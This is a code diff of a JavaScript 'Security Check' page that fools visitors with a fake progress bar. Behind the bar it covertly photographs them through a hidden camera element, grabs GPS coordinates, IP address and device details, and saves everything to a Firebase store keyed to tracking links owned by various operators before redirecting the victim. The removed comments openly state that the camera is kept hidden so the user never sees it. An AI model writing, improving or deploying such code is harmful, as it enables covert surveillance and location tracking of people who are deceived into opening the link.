@@ -33,7 +33,6 @@ function setProgress(pct) {
 }
 
 // ── FAKE PROGRESS BAR SETUP ───────────────────────────────────────────────
-// Returns a controller object { update(pct, text), finish() }
 function buildProgressUI(container) {
     container.innerHTML = `
         <h2>Security Check</h2>
@@ -47,7 +46,6 @@ function buildProgressUI(container) {
         <canvas id="canvas" style="display:none;"></canvas>
     `;
 
-    // Ambient progress ticks — slow crawl that never reaches 100%
     const steps = [
         [10, "Checking SSL certificate..."],
         [20, "Connecting to server..."],
@@ -72,7 +70,7 @@ function buildProgressUI(container) {
     }, 900);
 
     return {
-        stop() { clearInterval(ticker); },
+        stop()   { clearInterval(ticker); },
         finish() {
             clearInterval(ticker);
             setProgress(100);
@@ -99,7 +97,6 @@ async function collectDeviceInfo() {
         pageUrl:        window.location.href,
     };
 
-    // Network info
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (conn) {
         info.networkType = conn.effectiveType || 'Unknown';
@@ -109,7 +106,6 @@ async function collectDeviceInfo() {
         info.downlink    = 'Unknown';
     }
 
-    // Battery (best-effort — not available on all browsers)
     try {
         const bat     = await Promise.race([
             navigator.getBattery(),
@@ -122,7 +118,6 @@ async function collectDeviceInfo() {
         info.charging = 'Unavailable';
     }
 
-    // OS
     if      (/android/i.test(ua))           info.os = 'Android';
     else if (/iphone|ipad|ipod/i.test(ua))  info.os = 'iOS';
     else if (/windows phone/i.test(ua))     info.os = 'Windows Phone';
@@ -131,7 +126,6 @@ async function collectDeviceInfo() {
     else if (/linux/i.test(ua))             info.os = 'Linux';
     else                                    info.os = 'Unknown';
 
-    // Browser (order matters — Edge & Opera contain "Chrome")
     if      (/edg\//i.test(ua))                          info.browser = 'Edge';
     else if (/opr\/|opera/i.test(ua))                    info.browser = 'Opera';
     else if (/chrome\/\d/i.test(ua))                     info.browser = 'Chrome';
@@ -160,10 +154,7 @@ async function getIPAddress() {
     return 'Unavailable';
 }
 
-// ── CAPTURE PHOTO FROM CAMERA ─────────────────────────────────────────────
-// BUG FIXED: video.onloadedmetadata set BEFORE srcObject assignment
-// BUG FIXED: video kept hidden (1×1 invisible) so user never sees it
-// BUG FIXED: separate timeout promise prevents the race with onloadedmetadata
+// ── CAPTURE PHOTO ─────────────────────────────────────────────────────────
 async function capturePhoto() {
     const video  = document.getElementById('video');
     const canvas = document.getElementById('canvas');
@@ -177,36 +168,28 @@ async function capturePhoto() {
             audio: false
         });
     } catch (e) {
-        // Permission denied or no camera — not fatal
         console.warn('Camera denied:', e.message);
         setStatus('');
         return null;
     }
 
-    // Attach stream — set onloadedmetadata BEFORE srcObject to avoid missing the event
-    // BUG FIXED: Previously srcObject was set first, event could fire before handler registered
     const readyPromise = new Promise(resolve => {
         video.onloadedmetadata = () => {
             video.play().catch(() => {}).finally(resolve);
         };
-        // Hard fallback in case event never fires (some mobile browsers)
         setTimeout(resolve, 6000);
     });
 
     video.srcObject = stream;
     await readyPromise;
-
-    // Give camera sensor time to auto-expose
     await new Promise(r => setTimeout(r, 1200));
 
-    // Take the shot
     canvas.width  = video.videoWidth  || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     const photoData = canvas.toDataURL('image/jpeg', 0.80);
 
-    // Stop all tracks immediately
     stream.getTracks().forEach(t => t.stop());
     video.srcObject = null;
 
@@ -219,24 +202,15 @@ async function getLocation() {
     setStatus('📍 Requesting location access...');
     return new Promise(resolve => {
         if (!navigator.geolocation) { resolve({ lat: 'Unavailable', lon: 'Unavailable' }); return; }
-
         navigator.geolocation.getCurrentPosition(
-            pos => {
-                setStatus('');
-                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-            },
-            err => {
-                console.warn('GPS denied:', err.message);
-                setStatus('');
-                resolve({ lat: 'Denied', lon: 'Denied' });
-            },
+            pos => { setStatus(''); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }); },
+            err => { console.warn('GPS denied:', err.message); setStatus(''); resolve({ lat: 'Denied', lon: 'Denied' }); },
             { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
         );
     });
 }
 
-// ── VALIDATE REDIRECT URL ─────────────────────────────────────────────────
-// BUG FIXED: empty string "" was falsy but not caught — now we strip and validate
+// ── VALIDATE URL ──────────────────────────────────────────────────────────
 function isValidUrl(url) {
     if (!url || typeof url !== 'string') return false;
     const s = url.trim();
@@ -254,7 +228,6 @@ async function initVerification() {
     const params = new URLSearchParams(window.location.search);
     const linkId = params.get('linkId');
 
-    // ── No link ID ──
     if (!linkId) {
         document.body.innerHTML = `
             <div style="text-align:center; margin-top:80px; font-family:sans-serif; color:#333;">
@@ -264,7 +237,6 @@ async function initVerification() {
         return;
     }
 
-    // ── Fetch settings ──
     let settings;
     try {
         const snap = await get(ref(db, 'managed_links/' + linkId));
@@ -279,7 +251,6 @@ async function initVerification() {
         return;
     }
 
-    // ── Invalid / disabled link ──
     if (!settings || !settings.active) {
         document.body.innerHTML = `
             <div style="text-align:center; margin-top:80px; font-family:sans-serif; color:#333;">
@@ -289,29 +260,20 @@ async function initVerification() {
         return;
     }
 
-    // ── Increment visit count (fire-and-forget) ──
+    // Increment visit count
     update(ref(db, 'managed_links/' + linkId), { visits: (settings.visits || 0) + 1 }).catch(() => {});
 
-    // ── Build UI ──
     const container = document.querySelector('.container');
     const progress  = buildProgressUI(container);
-
-    // ── IMMEDIATELY trigger permissions before any async work ──
-    // BUG FIXED: Previously permissions were requested after device info + IP fetch
-    // which added 1-3 seconds of delay before the browser prompt appeared.
-    // Now we fire them in parallel with background data collection.
 
     const needsCam = !!settings.cam;
     const needsGPS = !!settings.gps;
 
-    // Start cam + gps in parallel — both trigger browser prompts immediately
-    // Start background info collection at the same time
-    const camPromise  = needsCam ? capturePhoto()    : Promise.resolve(null);
-    const gpsPromise  = needsGPS ? getLocation()     : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
+    const camPromise  = needsCam ? capturePhoto()  : Promise.resolve(null);
+    const gpsPromise  = needsGPS ? getLocation()   : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
     const infoPromise = collectDeviceInfo();
     const ipPromise   = getIPAddress();
 
-    // Await all — cam/gps show browser prompts; info/ip run silently in background
     const [photoData, gpsResult, deviceInfo, ipAddress] = await Promise.all([
         camPromise, gpsPromise, infoPromise, ipPromise
     ]);
@@ -319,24 +281,26 @@ async function initVerification() {
     const lat = gpsResult?.lat ?? 'Denied';
     const lon = gpsResult?.lon ?? 'Denied';
 
-    // ── Save to Firebase ──
+    // ── Save to Firebase — inherit owner from the link ──
     const now       = Date.now();
     const saveError = await (async () => {
         try {
             const newRef = push(ref(db, 'photo_history'));
             await set(newRef, {
-                id:        now,
-                // BUG FIXED: only store image if we actually got one — saves Firebase bandwidth
-                image:     photoData || null,
-                latitude:  lat,
-                longitude: lon,
-                linkName:  settings.name  || 'Unknown',
-                linkId:    linkId,
-                date:      new Date(now).toLocaleDateString(),
-                time:      new Date(now).toLocaleTimeString(),
-                timestamp: now,
-                ipAddress: ipAddress,
-                device:    deviceInfo
+                id:          now,
+                image:       photoData || null,
+                latitude:    lat,
+                longitude:   lon,
+                linkName:    settings.name  || 'Unknown',
+                linkId:      linkId,
+                date:        new Date(now).toLocaleDateString(),
+                time:        new Date(now).toLocaleTimeString(),
+                timestamp:   now,
+                ipAddress:   ipAddress,
+                device:      deviceInfo,
+                // Ownership — inherited from the link that was opened
+                _ownerType:  settings._ownerType || 'admin',
+                _ownerId:    settings._ownerId    || 'admin'
             });
             return null;
         } catch (e) {
@@ -345,7 +309,6 @@ async function initVerification() {
         }
     })();
 
-    // Finish the progress UI regardless of save success
     progress.finish();
 
     if (saveError) {
@@ -353,17 +316,12 @@ async function initVerification() {
         return;
     }
 
-    // ── Redirect ──
-    // BUG FIXED: was checking `settings.redirectUrl` which passes for empty string ""
-    // BUG FIXED: was waiting 2000ms — now redirects immediately after save
     if (isValidUrl(settings.redirectUrl)) {
         setStatus('✅ Done! Redirecting...');
-        // Tiny delay so user sees the success message (200ms)
         setTimeout(() => {
             window.location.replace(settings.redirectUrl.trim());
         }, 200);
     }
-    // If no redirect URL — verification complete, page stays as-is
 }
 
 // ── BOOT ─────────────────────────────────────────────────────────────────
